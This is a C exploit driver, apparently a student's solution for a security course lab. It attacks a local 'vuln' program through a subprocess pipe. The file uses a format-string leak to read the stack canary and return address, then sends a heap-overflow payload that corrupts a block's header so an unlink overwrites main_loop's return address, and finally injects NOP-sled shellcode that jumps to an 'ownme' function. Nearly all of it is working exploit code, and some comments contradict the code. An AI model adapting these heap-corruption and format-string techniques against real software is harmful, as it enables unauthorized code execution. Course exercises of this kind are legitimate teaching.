// Need to write 248 bytes to overwrite the next block's previous
// Need to first overflow the first block into the second one and set the current->prev of the second block to the address of the buffer that is going to hold the exploit code
// Next need to do a second overflow for the second block into the third one in order to get the current->prev of the third block to point to the return address of main_loop. This will make it so that when the second block gets removed, then it will write the address of the exploit code to the return address.

// 244 is the size of the heap block without the header
// 268 bytes will overwrite the whole header of the next block

#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

#define MAX_GRP 100

/******************************************************************************
   Unless you are interested in the details of how this program communicates
   with a subprocess, you can skip all of the code below and skip directly to
   the main function below.
*******************************************************************************/

#define err_abort(x) do { \
      if (!(x)) {\
         fprintf(stderr, "Fatal error: %s:%d: ", __FILE__, __LINE__);   \
         perror(""); \
         exit(1);\
      }\
   } while (0)

char buf[1<<20];
unsigned end;
int from_child, to_child;

void print_escaped(FILE *fp, const char* buf, unsigned len) {
   int i;
   for (i=0; i < len; i++) {
      if (isprint(buf[i]))
         fputc(buf[i], stderr);
      else fprintf(stderr, "\\x%02hhx", buf[i]);
   }
}

void put_bin_at(char b[], unsigned len, unsigned pos) {
   assert(pos <= end);
   if (pos+len > end)
      end = pos+len;
   assert(end < sizeof(buf));
   memcpy(&buf[pos], b, len);
}

void put_bin(char b[], unsigned len) {
   put_bin_at(b, len, end);
}

void put_formatted(const char* fmt, ...) {
   va_list argp;
   char tbuf[10000];
   va_start (argp, fmt);
   vsnprintf(tbuf, sizeof(tbuf), fmt, argp);
   put_bin(tbuf, strlen(tbuf));
}

void put_str(const char* s) {
   put_formatted("%s", s);
}

static
void send() {
   err_abort(write(to_child, buf, end) == end);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   fprintf(stderr, "driver: Sent:'");
   print_escaped(stderr, buf, end);
   fprintf(stderr, "'\n");
   end = 0;
}

char outbuf[1<<20];
int get_formatted(const char* fmt, ...) {
   va_list argp;
   va_start(argp, fmt);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   int nread=0;
   err_abort((nread = read(from_child, outbuf, sizeof(outbuf)-1)) >=0);
   outbuf[nread] = '\0';
   fprintf(stderr, "driver: Received '%s'\n", outbuf);
   return vsscanf(outbuf, fmt, argp);
}

int pid;
void create_subproc(const char* exec, char* argv[]) {
   int pipefd_out[2];
   int pipefd_in[2];
   err_abort(pipe(pipefd_in) >= 0);
   err_abort(pipe(pipefd_out) >= 0);
   if ((pid = fork()) == 0) { // Child process
      err_abort(dup2(pipefd_in[0], 0) >= 0);
      close(pipefd_in[1]);
      close(pipefd_out[0]);
      err_abort(dup2(pipefd_out[1], 1) >= 0);
      err_abort(execve(exec, argv, NULL) >= 0);
   }
   else { // Parent
      close(pipefd_in[0]);
      to_child = pipefd_in[1];
      from_child = pipefd_out[0];
      close(pipefd_out[1]);
   }
}

/* Shows an example session with subprocess. Change it as you see fit, */

#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

int main(int argc, char* argv[]) {
   unsigned seed;

   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;
   create_subproc("./vuln", nargv);

   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
           "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
           "to continue with the exploit\n");

   getchar();

   // Run vuln program under GDB. Set breakpoints in main_loop, auth and g
   // to figure out and populate the following values

   void *auth_bp = 0xbfffe808;     // saved ebp for auth function (done)
   void *mainloop_bp = 0xbffff038; // saved ebp for main_loop (done)
   void *auth_ra = 0x08048968;     // return address for auth (done)
   void *mainloop_ra = 0x0804e820; // return address for main_loop (done)

   // The following refer to locations on the stack
   void *auth_user = 0xbfffe650;   // value of user variable in auth (done)
   void *auth_canary_loc = 0xbfffe7cc; // location where auth's canary is stored (done)
   void *auth_bp_loc = 0xbfffe7d8; // location of auth's saved bp (done)
   void *auth_ra_loc = 0xbfffe7dc; // location of auth's return address (done)
   void *g_authd = 0xbfffe7f4;     // location of authd variable of g (done)
   void *ownme_loc = 0x0804e3ab;    // location of ownme in memory (done)
   void *mainloop_bp_loc = 0xbffff008; // location of the bp of mainloop (done)
   void *auth_user_loc = 0xbfffe7c4; // location of the user variable in auth (done)
   void *g_bp = 0xb7fbbcc0; // The value of g's saved base pointer (done)
   void *g_bp_loc = 0xbfffe7f0; // The location of g's base pointer (done)

   void *mainloop_bp_updated = 0xbffff008;
   void *mainloop_rdbuf = 0xbfffe8d0;

   // These values discovered above using GDB will vary across the runs, but the
   // differences between similar variables are preserved, so we compute those.
   unsigned mainloop_auth_bp_diff = mainloop_bp - auth_bp;
   unsigned mainloop_auth_ra_diff = mainloop_ra - auth_ra;

   unsigned auth_canary_user_diff = auth_canary_loc - auth_user;
   unsigned auth_bp_user_diff = auth_bp_loc - auth_user;
   unsigned auth_ra_user_diff = auth_ra_loc - auth_user;
   unsigned g_authd_auth_user_diff = g_authd - auth_user;
   unsigned main_ownme_diff = mainloop_ra - ownme_loc;
   unsigned auth_bp_main_bp_diff = mainloop_bp_loc - auth_bp_loc;
   unsigned main_bp_main_ra_diff = mainloop_bp_loc + 4;
   unsigned auth_bp_main_ra_diff = (mainloop_bp_loc + 4) - auth_bp_loc;
   unsigned g_bp_loc_mainloop_ra_diff = (mainloop_bp_loc + 4) - g_bp_loc;
   unsigned auth_ra_user_loc_diff = auth_ra_loc - auth_user_loc;
   unsigned auth_bp_user_loc_diff = auth_bp_loc - auth_user_loc;
   
   unsigned main_loop_bp_ra_diff = 0x4;
   unsigned main_loop_bp_rdbuf_diff = mainloop_bp_updated - mainloop_rdbuf;

   printf("g_bp_loc_main_ra_diff = %x | main_ownme_diff = %x \n\n", g_bp_loc_mainloop_ra_diff, main_ownme_diff);
   // auth_bp_main_ra_diff = 0x81c
   // main_ownme_diff = 0x475

   // Use GDB + trial&error to figure out the correct offsets where the the
   // stack canary, the saved ebp value, and the return address for the
   // main_loop function are stored. Use those offsets in the place of the
   // numbers in the format string below.
   put_str("e %507$x %510$x %511$x\n");
   send();

   // Once all of the above information has been populated, you are ready to run
   // the exploit.

   unsigned cur_canary, cur_mainloop_bp, cur_mainloop_ra;
   get_formatted("%x%x%x", &cur_canary, &cur_mainloop_bp, &cur_mainloop_ra);
   fprintf(stderr, "driver: Extracted canary=%x, bp=%x, ra=%x\n", 
           cur_canary, cur_mainloop_bp, cur_mainloop_ra);

   // Allocate and prepare a buffer that contains the exploit string.
   // The exploit starts at auth's user, and should go until g's authd, so
   // allocate an exploit buffer of size g_authd_auth_user_diff+sizeof(authd)
   unsigned explsz = 264;
   void* *expl = (void**)malloc(explsz);

   // Initialize the buffer with '\0', just to be on the safe side.
   memset((void*)expl, 0x90, explsz);

   // Now initialize the parts of the exploit buffer that really matter. Note
   // that we don't have to worry about endianness as long as the exploit is
   // being assembled on the same architecture/OS as the process being
   // exploited.
   

   // Overwrite the in_use variable
   expl[244/sizeof(void*)] = 0x00000000;   

   // Overwrite the size with the right size of the block
   expl[248/sizeof(void*)] = 244;

   expl[252/sizeof(void*)] = 244;

   // Overwrite the prev of the next block with the address of the buffer
   expl[256/sizeof(void*)] = (void*)(cur_mainloop_bp - main_loop_bp_rdbuf_diff);
   //expl[256/sizeof(void*)] = (void*)(ownme_loc);
   printf("THE LOCATION OF READ BUF: %x\n", cur_mainloop_bp - main_loop_bp_rdbuf_diff);

   // Overwrite the prev of the next block with the address of the return address of main_loop
   expl[260 / sizeof(void*)] = (void*)(cur_mainloop_bp - 0x30 + main_loop_bp_ra_diff - 0xc);
   printf("THE LOCATION OF THE RETURN ADDRESS: %x\n", cur_mainloop_bp - 0x30 + main_loop_bp_ra_diff);

   // Call u with and arbitrary username
   put_str("u xyz\n");
   send();

   // Now, send the payload
   put_str("p ");
   put_bin((char*)expl, explsz);
   put_str("\n");
   send();

   put_str("l \n");
   send();


   memset((void*)expl, '\0', explsz/2);

   unsigned code0 = 0x04e3abb8;
   unsigned code1 = 0xe0ff08;

   expl[0] = 0x90909090;
   expl[1] = 0x90909090;
   expl[2] = 0x90909090;
   expl[3] = 0x90909090;
   expl[4] = 0x90909090;
   expl[5] = 0x90909090;
   expl[6] = 0x90909090;
   expl[7] = 0x90909090;
   expl[8] = 0x90909090;
   expl[9] = 0x90909090;
   expl[10] = 0x90909090;
   expl[11] = 0x90909090;
   expl[12] = 0x90909090;
   expl[13] = code0;
   expl[14] = code1;

   put_str("q ");
   put_bin((char*)expl, explsz/2);
   put_str("\n");
   send();

   usleep(100000);
   get_formatted("%*s");

   kill(pid, SIGINT);
   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   }
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   }
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   }
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   }

}
